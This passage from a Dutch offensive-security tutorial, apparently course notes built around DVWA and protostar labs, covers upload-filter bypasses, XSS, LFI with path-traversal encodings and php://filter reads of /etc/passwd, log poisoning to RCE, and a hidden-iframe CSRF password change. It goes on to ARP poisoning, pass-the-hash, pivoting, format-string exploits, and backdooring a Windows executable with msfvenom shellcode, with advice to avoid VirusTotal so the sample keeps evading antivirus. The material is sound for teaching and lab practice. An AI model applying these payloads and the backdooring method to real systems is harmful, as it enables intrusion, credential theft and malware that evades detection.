    		die("Please upload an image!");
    	} 
    ?>
    
Alhoewel dit script het bestand plaatje.png keurig door zal laten en het bestand 3v1l_sh3ll.php keurig zal weigeren, zit er toch een klein foutje in. Dit foutje is ontstaan doordat gebruik is gemaakt van de functie [strpos](http://php.net/strpos). De functie strpos zoekt de eerste positie van een needle ($extension) in de gehele haystack ($filename). Mocht je nu een bestand uploaden met de naam 3v1l_1mag3.jpg.php dan zal het script bovenin beginnen met uitvoeren en na eerst op de string .gif gecontroleerd te hebben zal hij al snel door springen naar de .jpg string. Deze zit in onze bestandsnaam en dus geeft hij de aanvangspositie (10) terug.

Omdat er een aanvangspositie is, geeft strpos geen false terug en is valid voorzien van de waarde 1. Uw shell kan nu ge-upload worden. Wat altijd van belang is, is dat de extensie er een is die door de webserver ook daadwerkelijk met de juiste taal geparsed zal worden.  

#### Meegezonden MIME type ####
Browsers sturen bij een file upload vaak de mime type van het geuploade bestand mee. In het volgende demoscript is dit het geval:
    
    <?PHP
    	$mimetypes = array('image/gif','image/jpg','image/png','image/jpeg');
    	$mimetype = $_FILES['upload']['mime'];

		$valid = 0;
		if (in_array($mimetype,$mimetypes) !== false)
		{
			$valid = 1;
		}
    
    	if ($valid !== 1)
    	{
    		die("Please upload an image!");
    	} 
    ?>
    
Als je dit script bekijkt zul je zo snel geen kwetsbaarheden zien, dat komt omdat er in het script zelf geen kwetsbaarheden zitten. Alhoewel het voor de eindgebruiker niet zichtbaar is stuurt de browser het MIME type mee met een file upload. Dit script is dus eigenlijk gebaseerd op client input. Als je je request door een proxy server als burp suite haalt, hem intercept en vervolgens het MIME type aanpast, dan zal je zien dat je upload gaat werken.

**Insert hier uitleg met curl en firefox :D**

### Fouten in de logica ###

#### PHP Redirects ####

In PHP gebruikt men vaak HTTP headers om redirections te doen.

    <?PHP
		if ($loggedin == 0)
		{
			header("Location: /");
		}
		echo "Geheimen";
	?>

Alhoewel in dit voorbeeld de header voor de HTTP redirect al wel verzonden is, gaat de script uitvoer wel door. Je kan dan, als je de redirect voorkomt, alsnog alles onder de redirect lezen. Er zijn plugins voor browsers die je hiervoor kan gebruiken, zoals de [https://addons.mozilla.org/nl/firefox/addon/noredirect/](https://addons.mozilla.org/nl/firefox/addon/noredirect/ "Firefox addon noredirect."). Na een redirect dient de execution altijd gestaakt te worden met een exit of een die.

### Cross site scripting ###
Cross site scripting (XSS) is een techniek waarbij je “slechte” gebruikersinvoer kunt plaatsen op een website. Deze invoer kan je vervolgens gebruiken om mensen te besmetten of om hun cookies / credentials te stelen. 

Sommige browsers zoals Chrome en Internet Explorer >8.0 geven een foutmelding op het moment dat je XSS wilt uitvoeren. 

Als mensen op een plaats HTML gebruiken om inhoud weer te geven, zoals bij sommige messenger applicaties e.d., dan kan het ook zomaar zijn dat er een browser gebruikt is om dit weer te geven. Browsers voeren javascript uit, en derhalve kan je zomaar gebruik maken van XSS in andere applicaties dan browsers. 

#### Reflected XSS ####
Reflected of non-persistent XSS is een techniek waarbij een fout in de input sanitization het weergeven van kwaadaardige code toe staat. Het belangrijkste om te onthouden is dat in dit geval de aanval niet op de website opgeslagen is, en iemand dus alleen slachtoffer kan worden als hij echt jouw link aan klikt met de aanval.

#### PHP voorbeeld Reflected XSS ####
Het volgende code voorbeeld is kwetsbaar voor XSS 

    <?PHP
    	if (isset($_GET['status']))
    	{
    		echo $_GET['status'];
    	}
    ?>

Als je dit in een php pagina zet, en deze PHP pagina bezoekt met als [querystring](https://nl.wikipedia.org/wiki/Querystring) status=%3Cscript%3Ealert%28%27xss%27%29%3B%3C%2Fscript%3E zie je het volgende:

![](images/reflective_xss.png) 

**Let op!** de waarden zijn urlencoded om geen verstoring in de URL te geven. 

#### Stored XSS ####
Stored of persistent XSS is een techniek waarbij een fout in de input sanitization het opslaan van je aanval mogelijk maakt. Dit soort aanvallen maken meer slachtoffers omdat iedereen die de specifieke pagina bezoekt er mee besmet zal worden.

**DVWS voorbeeld**
![](images/xss_stored_alertxss.png)
![](images/xss_stored_alertxss_result.png)


#### DOM XSS ####
DOM (Document Object Model) XSS is een methode waarbij een aanvaller de kwaadaardige code op zo een manier plaatst dat het nooit via de webserver loopt. Dit kan bijvoorbeeld als [javascript](https://nl.wikipedia.org/wiki/JavaScript) gebruik maakt van de URL van een webpagina zonder hierop een juiste input sanitization te doen.

## Local file inclusion ##
LFI is een aanvalstechniek die volledig Local File Inclusion heet. Het is een kwetsbaarheid waarbij een applicatie gebruikersinvoer niet op een juiste wijze bewerkt. Door deze kwetsbaarheid te misbruiken krijg je de mogelijkheid om bestanden in te laden waar dit (eigenlijk) niet de bedoeling was. Op deze manier kan je potentieel bestanden lezen als /etc/passwd of andere gevoelige bestanden.

File includes zijn redelijk te herkennen aan de parameters achter een pagina naam. Denk hierbij aan een GET parameter als file of page. Vaak zie je hier dan een bestandsnaam staan. In de submappen zijn enkele opdrachten te vinden waarmee je zelf met LFI kunt spelen.

## Path traversal ##
Path Traversal wordt ook wel Directory Traversal genoemd. Eigenlijk is dit niets anders dan in een regulier Linux filesystem navigeren. Als je iets in een andere map wilt zoeken zul je hier naar toe moeten navigeren op een manier zoals je dat op de command line ook doet. Als je test.txt wilt weergeven die een map hoger in de directory structuur staat kan je “cat ../test.txt” gebruiken.

Je kan op deze manier geen sources van PHP bestanden in zien. PHP bestanden worden door de PHP functies [include](https://www.php.net/include) en [require](https://www.php.net/require) ingeladen en geparsed. Hierdoor zal je hetzelfde zien als wat je ziet als je de pagina rechtstreeks bezoekt.

In sommige gevallen gebruiken mensen een WAF of hebben ze zelf scripting geschreven die opgegeven path's op hun inhoud filteren. Lang niet alle implementaties die mensen verzinnen geven een goede filtering. Wil je een inclusion mogelijkheid vinden dan is het altijd handig om in de querystrings te kijken naar keys die namen hebben als file, dir of path. Vaak gaat het dan om alfanumerieke waarden, maar dit hoeft niet altijd zo te zijn! Meestal is het handigst om even in de page source in je browser te kijken.

Om bepaalde filters te omzeilen kan je bijvoorbeeld je path url encoden of tweemaal url encoden. Dit geeft in die volgorde de volgende resultaten:

    ../
    %2e%2e%2f
    %252e%252e%252f

Ook kan je je path traversal in unicode opgeven uit de hoop dat een ontvangende applicatie hier niet correct mee om kan gaan. In sommige gevallen filteren scripts op *../* . Je kan dan ook eens een andere slash gebruiken dan die je net gebruikte. 

Mochten ze onverhoopt ../ en ..\ er uit filteren zoals in het volgende code voorbeeld:

    <?PHP
    	$path = $_GET['path'];
    	$path = ereg_replace('\.\./','',$path);
    	$path = ereg_replace('\.\./','',$path);
    	echo $path;
    ?>

Dan kan je bijvoorbeeld de volgende string opgeven:

    ...\.\

PHP zal in dat geval eerst de ..\ er uit filteren, en dan houd je alsnog een correcte path traversal over. 

### Simpele beveiliging ###
In sommige gevallen proberen developers een local file inclusion te voorkomen door bijvoorbeeld een extensie op te geven in hun include. Op deze manier kunnen ze voorkomen dat je bijvoorbeeld /etc/passwd uit kan lezen, omdat /etc/passwd.php niet bestaat.
 
In programmeertalen worden strings meestal beëindigd met een zogenaamde [null-byte](https://en.wikipedia.org/wiki/Null_character). Een null-byte is hexadecimaal 0x00 en heeft geen teken om hem weer te geven. Als je zelf een null-byte kan injecten in deze file, dan kan je potentieel voorkomen dat de extensie er achter geplakt wordt. 

Als het je niet lukte dan kan dit komen omdat je je URL niet correct ge-encode hebt. Een nullbyte kan je niet zomaar meesturen, maar moet door de webserver wel correct geïnterpreteerd worden. Stuur dus %00 mee in plaats van 0x00 of 0. De nullbyte methode werkt enkel in PHP < 5.3.

In filesystem functies trunct PHP onder linux de paden automatisch naar 4096 tekens. Je kan dit voor elkaar krijgen door voor het path een opstapeling van “./” strings op te nemen totdat je op dit maximum zit.

### LFI naar RCE via Log bestanden ###
Je kan met logbestanden potentieel RCE verkrijgen. Als je nieuwsgierig bent kan je de logbestanden in /var/log zelf bekijken en zien welke log bestanden je hiervoor zal kunnen misbruiken. Als je iets in een log bestand weet weg te schrijven kan je vervolgens het bestand includen en je code laten uitvoeren.

### PHP Wrapper ###

PHP kent verschillende wrappers. Met [PHP Wrappers](http://php.net/manual/en/wrappers.php.php) kan je toegang krijgen tot diverse I/O streams van applicaties en op deze wijze kan je bestanden uitlezen of commando’s op servers uitvoeren. Deze wrappers zijn voornamelijk bedoeld om met functies als readfile, file en file_get_contents te werken. 

#### php://data ####
#### php://stdin, php://stdout en php://stderr ####
#### php://input ####

De php://input wrapper voert altijd de complete inhoud van een POST request uit. Deze inhoud zal uitgevoerd worden zonder dat het door PHP, en de instellingen in php.ini, geparsed zijn. Hierdoor kan je commando’s op de server uitvoeren.

Installeer vervolgens de Firefox [Hackbar](https://addons.mozilla.org/nl/firefox/addon/hackbar/) op je lokale machine. Met de Hackbar kan je vervolgens POST verzoeken sturen naar de webserver en pagina.php met als url: <jeurl>/pagina.php?file=php://input


#### php://output ####
#### php://fd ####
#### php://memory en php://temp ####
#### php://filter ####
In sommige gevallen kan je enkel gebruik maken van [filters](http://php.net/manual/en/filters.php) om informatie uit te lezen. 

De syntax van filters is als volgt:
 
    php://filter/<type>.<filter>/<parameter>

Wil je een bestand uitlezen en deze base64 gecodeerd weergeven dan kun je het volgende gebruiken. 


    php://filter/convert.base64-encode/resource=../../../etc/passwd

### Zelf bestanden introduceren ###
Je kan zelf bestanden introduceren door middel van bijvoorbeeld upload formulieren. Op foto deel websites kan je een foto uploaden maar geen PHP bestanden. Je kan PHP code opnemen in de metadata, de zogenaamde [EXIF informatie](https://nl.wikipedia.org/wiki/Exchangeable_image_file_format), van een afbeelding en deze via LFI kwetsbaarheid laten uitvoeren.


### Handige systeembestanden ###
Er bestaan systeembestanden die te misbruiken zijn als je de juiste invoer gebruikt. Dit zijn voornamelijk bestanden in de /proc/self mappen van Linux.
Dit zijn specifieker:

#### /proc/self/cmdline ####
#### /proc/self/stat ####
#### /proc/self/fd/[0-35] ####
In een van de filedescriptors van het huidige proces staat de Apache error log weggeschreven. Je kan zelf php code in de logging wegschrijven en deze later weer opvragen.

![](http://gatochhacken.nl/images/lfi_file_fd_errorlog.png)

#### /proc/self/environ ####
Als je de environ file kan includen dan heb je de beschikking over de environmental variabelen waaronder de applicatie op dat moment draait. Een van de gebruikersgegevens die in deze environmental variabelen terecht komt is de user agent. Doormiddel van handige Firefox plugin zoals [uaswitcher](https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/) kan je zelf je useragent aanpassen en hier bijvoorbeeld PHP code in plaatsen. 

### Cross Site Request Forgery ###
Cross Site Request Forgery of CSRF is een methode waarbij je gebruikers een actie kan laten uitvoeren zonder dat ze dit door hebben. In DVWA kan je dit zelf uitproberen, en ook bij CS zul je mogelijkheden vinden om dit te beoefenen.

Het simpelste voorbeeld uit DVWA is het aanpassen van je wachtwoord. Het formulier is naar de website toegestuurd in de querystring en er is geen mogelijkheid toegevoegd om te verifieren of die wel echt de actie van een ingelogde gebruiker was. Met het volgende code snippet zou je (als je ook XSS toegang hebt) eenvoudig elke langs surfende gebruiker zijn wachtwoord op de website kunnen aanpassen:

`<iframe src="http://<dvwa adres>/vulnerabilities/csrf/?password_new=qwerty&password_conf=qwerty&Change=Change#" style="width:0px;height:0px;>`

Elke gebruiker zal met de onzichtbare [iframe](https://www.w3schools.com/tags/tag_iframe.asp) automatisch de password vervang pagina aanroepen en het nieuwe wachtwoord qwerty instellen. 

# Netwerk aanvallen

## Enumeratie ##
Ook op netwerken is het erg belangrijk om een juiste enumeratie te doen. Het weten welke hosts er in het netwerk zijn en welke hosts er allemaal beschikbaar zijn om aan te vallen is één van de belangrijkste gegevens.

Bij het uitvoeren van een red team actie is het van belang dat het red team een zekere opbouw in "detecteerbaarheid" heeft. Immers het is de bedoeling dat het red team op een gegeven moment gedetecteerd wordt door het blue team om op deze wijze ook de incident response te kunnen testen.

### Passive host discovery

Er zijn diverse manieren om hosts op een netwerk te ontdekken, je kan actief scannen maar ook passief ontdekken welke systemen aanwezig zijn. Dit ontdekken zonder zelf activiteit in het netwerk te veroorzaken zal logischerwijs minder opvallen. Je kan met TCPdump een netwerkdump maken en deze in wireshark openen. Kijk naar alle binnenkomende ARP antwoorden en maak een lijstje van alle IP adressen die je voorbij ziet komen. Je kan, afhankelijk van de data die je binnenkrijgt natuurlijk ook andere protocollen dan ARP meenemen in dit lijstje.

Dit kun je ook eenvoudiger maken met de tool netdiscover en de schakeloptie -p.

### Actieve host discovery ###

#### Ping sweep ####
Een ping sweep is iets wat in gemonitorde omgevingen waarschijnlijk op zal vallen en het zal alleen werken als er geen ICMP filtering is geïmplementeerd. ICMP filtering voorkomt immers dat een host op een PING verzoek kan reageren.

Probeer zelf een programma te schrijven die het ICMP Ping pakket verzend, of gebruik nmap -sP < ipange > om het IP adres van je home lab server te vinden.


### Port scan ###
nmap -p < ports > < ip >

 

## ARP poisoning ##

Een van de manieren om een man in the middle positie te bemachtigen is ARP poisoning. ARP staat voor Address Resolution Protocol. Om de werking van ARP op een goede manier te begrijpen is het noodzakelijk om het OSI model te snappen. Voor het OSI model verwijs ik terug naar het "protocollen" kopje.

Het ARP protocol (laag 6) zorgt ervoor dat de computers binnen een IP subnet (laag 5) van elkaar kunnen weten aan welk MAC adres men een frame moet zenden. Als voorbeeld hebben wij een netwerk met de volgende systemen:

Hostnaam   - IP Adres	 - MAC adres
Computer A - 192.168.1.2 - MACADDR1
Computer B - 192.168.1.3 - MACADDR2

Op het moment dat computer A een berichtje wil sturen naar computer B zal computer A zowel het IP adres als het MAC adres van computer B weten. Het IP adres is ingegeven door de gebruiker, met dat IP adres stuurt computer A een ARP verzoek.

> Wie heeft IP adres 192.168.1.3? Vertel het 192.168.1.2!

Dit bericht wordt op laag 7 opgevangen door de computers op het subnet. Elke computer gaat in zijn OSI model omhoog vragen of het IP adres bij hem hoort. Laag 7 vraagt aan laag 6, laag 6 aan laag 5 en daar komt computer B erachter dat dit MAC adres van hem is. Computer B stuurt deze bevestiging terug naar laag 6, die weer naar laag 7 en dan wordt er op het netwerk het volgende ARP bericht verzonden:

> 192.168.1.3 is te vinden op MACADDR2

Op dat moment weet computer A het juiste MAC adres en kan computer A het pakketje versturen.

Bij ARP poisoning komen wij op computer C om de hoek.
Hostnaam   - IP Adres	 - MAC adres
Computer A - 192.168.1.2 - MACADDR1
Computer B - 192.168.1.3 - MACADDR2
Computer C - 192.168.1.4 - EVILMAC1

Computer A vraagt weer in het netwerk:

> Wie heeft IP adres 192.168.1.3? Vertel het 192.168.1.2!

maar het is nu niet computer B die als eerste kan reageren, maar dat zijn wij op computer C. Op het moment dat wij het verzoek van computer A zien sturen wij zo snel (en vaak) mogelijk naar het MAC adres van computer A:

> 192.168.1.3 is te vinden op EVILMAC1

> 192.168.1.3 is te vinden op EVILMAC1

> 192.168.1.3 is te vinden op EVILMAC1

> 192.168.1.3 is te vinden op EVILMAC1

en als wij eerder zijn dan de reactie van computer B dan wordt het bericht naar ons verzonden, ditzelfde doen wij ook zo snel mogelijk voor het pad van computer B naar computer A. Wij sturen op het netwerk ook zo vaak en snel mogelijk

> 192.168.1.3 is te vinden op EVILMAC1

> 192.168.1.3 is te vinden op EVILMAC1

> 192.168.1.3 is te vinden op EVILMAC1

> 192.168.1.3 is te vinden op EVILMAC1
 
naar het MAC adres van computer A. Op onze eigen computer zorgen wij ervoor dat wij de binnengekomen pakketten ook opnieuw verzenden naar de goede computer zodat het netwerk blijft draaien, en je hebt een Man in the Middle positie bemachtigd.

Tooling: Arpspoof, ettercap, bettercap 

## Pass the hash ##

In Windows domeinen kan er gebruikt worden van NTLM (NT Lan Manager) authenticatie. Dit is een authenticatiemethode die gebruikt maakt van het HTTP protocol om een single sign-on mogelijkheid te maken.

Bij pass the hash maak je gebruik van dit protocol om jezelf te authenticeren als een ander. Alhoewel wachtwoorden nooit ongehashed over het netwerk zullen gaan, en je dus niet zomaar als een ander kan inloggen als je naar zijn computer loopt, worden hashes wel over het netwerk verzonden. Aangezien een gebruiker zichzelf bij diensten (shares etc.) aanmeld met deze hash kan je die hergebruiken.

Geavanceerde hacktools om pash the hash mee te doen? PSExec [Windows Sysinternals](https://docs.microsoft.com/en-us/sysinternals/) of de vergelijkbare variant van Metasploit. Let wel op, de ene variant laat eerder een virusscanner af gaan dan de ander.

## Pivoting ##

## Iptables port forwarding ##
Alhoewel mensen vaak denken dat de [iptables](https://en.wikipedia.org/wiki/Iptables) alleen gebruikt kunnen worden om als firewall te dienen, kun je met iptables ook [port forwarding](https://nl.wikipedia.org/wiki/Port_forwarding) toepassen. Dit doe je doormiddel van, onder andere, de prerouting chain. Hiermee kun je de packets die aan de rule voldoen aan laten passen, voordat ze verwerkt worden door het besturingssysteem. Dit doe je overigens wel door de iptables van de host waar je overheen wilt pivotten aan te passen.

    iptables -t nat -A PREROUTING -p tcp -d < ServerIP > --dport < ServerPoort > -j DNAT --to-destination < EinddoelIP >:< EinddoelPort >

Nu zal het je opvallen dat alhoewel jij wel pakketten naar de andere kant kan sturen, jij nooit pakketten terug zal krijgen. Dit komt omdat de computer nu wel pakketten ontvangt die voor jou bedoeld zijn, maar er niets mee kan. Denk aan het OSI model, het adres klopt niet dus hij dropt de gegevens zonder ze te behandelen!

Om dit te voorkomen gaan we de computer ook nog toestemming geven om pakketten die vanaf < EinddoelIP > met < EinddoelPort > komen door te sturen naar het doel wat opgegeven is, in dit geval meestal jij dus.  

    iptables -A FORWARD -p tcp -d < EinddoelIP > --dport < EinddoelPort > -j ACCEPT

**Let op: ** Controleer even of de netwerkadapter waar we over praten port forwarding toe staat:

    cat /proc/sys/net/ipv4/conf/< netwerkadapter >/forwarding

Zo niet, zet dan de waarde op 1. 

Als je dit voor een webserver doet, kan je vervolgens gewoon naar http://< ServerIP >:< ServerPoort > surfen en dan zal je de pagina zien die op http://< EinddoelIP >:< EinddoelPort > draait.

Mocht dit niet werken kan je ook de volgende variant proberen, **let op,** deze verzorgt lokale forwarding.

	iptables -t nat -A PREROUTING -p tcp --destination-port < oorspronkelijke port > -j REDIRECT --to-ports < nieuwe Port >

## Meterpreter port forwarding ##
Als je gebruik maakt van meterpreter als shell dan zijn er standaard mogelijkheden om portforwarding toe te passen. Hiervoor kan je het commando portfwd. Deze methode gebruik je als volgt:

    portfwd add -L < lokale IP > -l < lokale poort > -r < remote IP > -p < remote poort > 

Bij het lokale IP, gaat het om het IP adres van de machine waar je metasploit op hebt draaien. Je hoeft deze niet persé op te geven.

Wil je de portforward weer weghalen, dan gebruik je bijna hetzelfde commando als hierboven maar vervang je add voor delete.

Een overzicht van alle actieve portforwards kan je opvragen door het list argument mee te geven, alles verwijderen doe je met het flush argument:

	portfwd list
	portfwd flush  

## SSH ##

### Remote SSH port forwarding ###
Een remote port forward kan je gebruiken als de server, die je onder controle hebt gekregen, dienst moet doen als pivot punt tussen jou en een andere server. Op deze manier kan je tussen twee netwerken hoppen waar je normaal geen toegang toe zou mogen hebben. Hierbij valt te denken aan een webserver met een aparte database server. Deze database server is door zijn iptables enkel toegestaan om met de webserver te communiceren. 

    Jij:	10.8.0.1
    Webserver: 192.168.1.1
    Database:  192.168.1.2

Allereerst zul je op de webserver de sshd_config moeten aanpassen. In deze file moet je de optie GatewayPorts op yes zetten. en hierna zul je SSH moeten herstarten.

Nu kan je het volgende doen: 

ssh -R 10.8.0.1:3306&#58;192.168.1.2:3306 192.168.1.1

In dit scenario zal elke verbinding afkomstig van 10.8.0.1 naar poort 3306 op 192.168.1.1 toegestaan worden, en geforward naar 192.168.1.2 poort 3306. **Let op,** doordat je in het begin je eigen IP adres hebt neergezet ben jij de enige die met deze poort kan connecten.

### Local SSH port forwarding ###
Een lokale port forward kan je gebruiken om services die alleen op localhost luisteren (memcached, mysql etc.) te ontsluiten naar het internet. Dit kan handig zijn omdat je je tooling mogelijk niet op een externe server wilt plaatsen maar op deze manier je tooling wel kan gebruiken. **Let op:** je zet de service dan wel voor iedereen open, tenzij je hem expliciet bind aan een lokaal ip adres. 

Als je op < remoteHost > de MySQL service wil laten luisteren op de TCP port 2000 kan je de volgende syntax gebruiken: 

    ssh -L 2000:127.0.0.1:3306 < remoteHost >

Als je wil dat hij de packets enkel doorstuurt als je connect naar het IP adres 192.168.1.1, dan moet je er een bind socket van maken.

    ssh -L 192.168.1.1:2000:127.0.0.1:3306 < remoteHost >


# Binary exploitation #

## Format strings ##

Format strings zijn ooit bedacht om de weergave van uitvoer in bepaalde functies te verzorgen. De lagere programmeertalen hebben hier vaker last van dan de hogere talen. Een van de vele voorbeelden van dergelijke kwetsbare functies zijn de print functies waar een f in voor komt. Je hebt bij dergelijke functies, bij goed gebruik, al een bepaald format opgegeven hoe de (bijvoorbeeld) string weergegeven moet worden. 

Een goed voorbeeld: 
	
	printf("%s",string);

Een fout voorbeeld:

    printf(string);

In het foute voorbeeld zijn er nog geen format strings opgegeven, deze kan je dan dus zelf opgeven. Op het internet zijn er op diverse plaatsen overzichten te vinden van de [format strings](https://en.wikipedia.org/wiki/Printf_format_string#Type_field). Als een voorbeeld omgeving kan je de format string exploits in [protostar](https://exploit-exercises.com/protostar/) van exploit-exercises gebruiken. In level 0 is de opdracht bijvoorbeeld het uitvoeren van format string attack waarbij je de target variabele met een bepaalde waarde vult. Als je C code kunt lezen zie je dat de buffer 64 bytes is en je target 4 bytes. Door de manier hoe alles op de stack gepushed zal worden (LIFO) zul je eerst 64 bytes moeten vullen voordat je bij de target variabele kan. 

Wij moeten de sprintf dus overtuigen om 64 bytes te vullen, en hierna een overflow te plaatsen om onze waarde weer te geven. Dit kan het eenvoudigst met een verkorte zoals %64d en dan de waarde die je wilt overschrijven. Dit is de eenvoudigste wijze van een buffer overflow. Op deze wijze voldoe je eveneens aan de wens om het onder de 10 bytes te doen. **Let op:** een hexadecimale waarde zoals een geheugenadres kan je niet zomaar achter een string aan typen, deze zul je nog moeten encoden. 

In level 1 gaat het om iets geavanceerdere aanvallen, hierbij is het niet heel erg evident op welke positie de waarde van je invoer op de stack terecht komt. Deze waarde zal je moeten bepalen, dit kan je of doen door een script te schrijven die gebruik maakt van Direct Parameter Access (%<positie>\$x) en deze te vergelijken met de waarde 41414141 of je kan dit doen door het te bruteforcen. De bruteforce methode ziet er als volgt uit:

![](images/protostar_level1_format_burteforce.png)

Je ziet aan het einde de reeks van 41 41 41 41 staan. Als je deze enkel door direct parameter access wilt laten zien kan je dit doen door bijvoorbeeld het commando:

    ./format1 AAAA`python -c 'print ".%127\$x"'`

Als het goed is zie je nu slechts 3 keer de 41 staan, dit komt omdat je nog niet genoeg informatie al naar de server geschreven had, danwel omdat je niet genoeg informatie al had uitgelezen. Dit voorkom je door het juiste uitleesformaat mee te geven aan je format string. Dit doe je tussen de $ en de x. Dit zal meestal 8 zijn.

    ./format1 AAAA`python -c 'print ".%127\$8x"'`

Als wij nu terug kijkne naar de opdracht dan is onze opdracht om een bepaald geheugenpunt te overschrijven in memory. Het geheugenpunt wat wij hiervoor moeten pakken is, als we op de logica letten in format1.c, het adres van target. Aangezien target nu veel hoger op de stack zal staan moeten wij eerst achterhalen welk geheugenadres we gaan overschrijven. De hint objdump -t is hier een erg goede hint. Gebruik objdump -t, en filter deze output op de tekst "target".

	objdump -t ./format1 | grep target

![](images/protostar_level1_format_find_target.png)

Het geheugenadres is 0x08049638, plaats deze nu in je format string in plaats van de A'tjes en zie je geheugenadres terug komen in je uitvoer. Bedenk jezelf nu welke format string placeholder je moet gebruiken om het geheugenadres daadwerkelijk te overschrijven en gebruik deze.


## Backdooren van een executable ##

Om een executable te backdooren heb je een aantal tools nodig. De eerste is [OllyDbg](http://www.ollydbg.de/), dit is een debugger voor Windows applicaties die gewoon onder Windows draait. De tweede is [LordPE](https://www.aldeid.com/wiki/LordPE), met deze applicatie kan je allerlei beheerstaken verrichten op executables.

In het voorbeeld wat hier gebruikt zal worden maak ik gebruik van Windows 10. Dit om te laten zien dat je met deze relatief oude tooling toch nog een goed resultaat kunt bereiken. Let wel op, in Windows 10 heeft een applicatie bij elke keer dat je het opnieuw opstart een nieuwe ASLR locatie. Je zult deze zelf even moeten bijhouden en bijwerken.

** [Code cave](https://en.wikipedia.org/wiki/Code_cave) maken **
Allereerst laden we de gekozen applicatie in in LordPE. Hierna klik je op sections, in de verschenen tabel klik je met de rechter muisknop en klik je op "Add section header". Er verschijnt een nieuwe sectie, .NewSec. Klik deze sectie opnieuw aan met de rechter muisknop en verander de VSize en de RSize in de gewenste grote. **Let op,** dit zijn hexadecimale getallen. 0x500 is groot genoeg.

Waarschijnlijk doet de executable het op dit moment niet meer, dit komt omdat de code cave die wij zojuist aangemaakt hebben nog niet bestaat. Open het bestand in je favoriete hex editor en voeg aan het einde 500 null bytes toe. 

Open vervolgens de applicatie in OllyDbg, en druk in de menubalk op de blauwe M. Zoek hier in de nieuwe sectie op en noteer het adres.

**Execution flow**
Vervolgens is het de bedoeling dat we de controle krijgen over de execution flow van het proces. Gebruik de F8 toets om verder te gaan in de executable, totdat je op het punt bent aangekomen dat je de eerste call ziet in het de executable. Selecteer deze instructie en de vijf instructies hierna, kopieer deze en plak ze in een kladblok. 

Dubbelklik vervolgens op deze call en vervang die voor een JMP instructie naar de cave:

	JMP < code cave adres >

Selecteer vervolgens de aanpassing, en druk op rechter muisknop->copy to executable->Selected, sluit het verschenen venster en kies een bestandsnaam of doe rechtermuisknop, save -> to file en selecteer een bestandsnaam. Maak van deze instructie een software breakpoint met F2. Herstart het programma met ctrl+F2.

Als het programma opnieuw gestart is druk je op F9 om direct door te springen naar de eerste breakpoint. Hierna druk je 1 keer op F7. Je ziet dat je nu in de geheugenrange van je code cave aanbeland bent. Als hier nu nog informatie staat, dan selecteer je alles vanaf het begin van je code cave en klik je op je rechter muisknop. Onder het kopje binairy klik je vervolgens op "Fill with 00's". Je vult het geselecteerde stuk dan met null bytes. Sla wederom je aanpassingen op.

**De payload genereren**
Voor deze oefening maken we een payload aan met MSFvenom. Deze payload is een windows messagebox die op popt met een melding. Ik neem niet de moeite om andere inhoud in deze messagebox te zetten, maar ik weerhoud je nergens van. Om de payload te genereren gebruik je het volgende commando:

	msfvenom -p windows/messagebox -f hex

De hexcode die je terug krijgt plak je even in je notitieblokje.

**De shellcode plaatsen**
Om de shellcode te plaatsen, en na het uitvoeren de applicatie ook weer correct te kunnen draaien, zullen wij eerst de registers en de [EFLAGS](https://en.wikipedia.org/wiki/FLAGS_register) moeten opslaan. Om de [registers](https://en.wikipedia.org/wiki/X86#Purpose) op te slaan maken wij gebruik van de assembly instructie PUSHAD. PUSHAD staat ons toe om in 1 instructie alle registers op de stack te pushen, (EAX, ECX, EDX, EBX, ESP, EBP, ESI en EDI) en PUSHFD doet hetzelfde, maar dan voor alle EFLAGS.

Hierna selecteer je de met MSFVenom gegenereerde shellcode, deze plak je met een binairy paste direct achter de PUSHFD. Je zult nu zien dat je shellcode verschijnt. Sla de aanpassingen wederom op en herstart de applicatie. Druk op F9, F7 en zet een breakpoint op de eerste regel van je shellcode. Druk nogmaals op F9. Je zult zien dat je programma nu tot aan de eerste regel van de assembly uitgevoerd is. Kijk naar de registerwaarde van ESP. Noteer deze, die gaan we later gebruiken om de stack weer te alignen.

Scroll nu naar het einde van je shellcode, zet direct na de shellcode een breakpoint. Druk nu op F9, en kijk weer naar de waarde van ESP. Je zult zien dat deze waarde kleiner is dan de waarde die je eerst had. Dit is het aantal bytes die je op de stack opgeschoven bent. Aangezien wij willen dat het programma weer normaal uit kan voeren is het noodzakelijk dat wij de registers terug gaan zetten. Om de registers terug te zetten moeten wij alleen wel de stackpointer zo hebben staan dat wij de juiste waarden terug POP'en.

Om de offset te berekenen openen wij in windows de calculator en zetten wij hem in de hexadecimale modus:

	< Eerste ESP > - < Tweede ESP > = offset

Wij gaan dit getal nu automatisch in assembly bij de ESP op laten tellen, direct na de shellcode dubbelklikken wij dus en tikken wij:

    ADD ESP,0< offset >

Als ESP weer goed gaat, gaan we in omgekeerde volgorde de flags en registers weer terug zetten:

    POPFD
	POPAD

**Execution flow herstellen**
Om te zorgen dat het programma waar wij onze backdoor in plaatsen, zonder foutmeldingen, blijft functioneren moeten wij de overschreven instructie weer aanroepen. Je moet een CALL doen op de eerste functie die je helemaal aan het begin in een notepad had geplakt (denk aan ASLR). We plaatsen dus het volgende:

    CALL < adres >

en om te zorgen dat het programma hierna de rest van de flow oppakt jumpen wij naar de tweede instructie (denk aan ASLR) toe:

	JMP < adres tweede instructie >

**Let op: ** Als je je executable tegen verschillende virusscanners wilt testen, maak dan **nooit** gebruik van [VirusTotal](https://www.virustotal.com). VirusTotal is een samenwerkingsverband van verschillende anti-virus bedrijven. De samples die je opvraagt worden naar hen, en andere veiligheidsonderzoekers, verspreid. De door jou zo zorgvuldig gemaakte sample zal dan snel genoeg niet meer werken.

## Geheugenbeheer ##

### Stack ###
De stack is een voor een proces gereserveerd stukje geheugen waarin een proces al zijn tijdelijke variabelen opgeslagen worden. Het is een LIFO lijst (Last In First Out). Als een aangeroepen functie, met de daarbij behorende argumenten, beëindigd is popt het systeem deze waarden van de stack af. 

De stack groeit naar beneden, het begint bij hoge geheugenadressen en werkt naar de lage adressen toe. Overigens, voor array's geld dat het geheugenbereik aan elkaar vast moet zitten. De stack groeit bij een array dus precies de andere kant op.  

### Heap ###
De heap is per proces gereserveerd, en is een poel geheugen waarbinnen een applicatie een geheugen reservering kan doen. Bij de heap zal je dus ook zelf het beheer van het geheugengebruik moeten doen. Het grote voordeel van de heap is dat je variabelen overal overal in je applicatie, mits de pointer natuurlijk bekend is, gebruikt kunnen worden. 

## Beveiligingsmechanismen ##

### ASLR ###
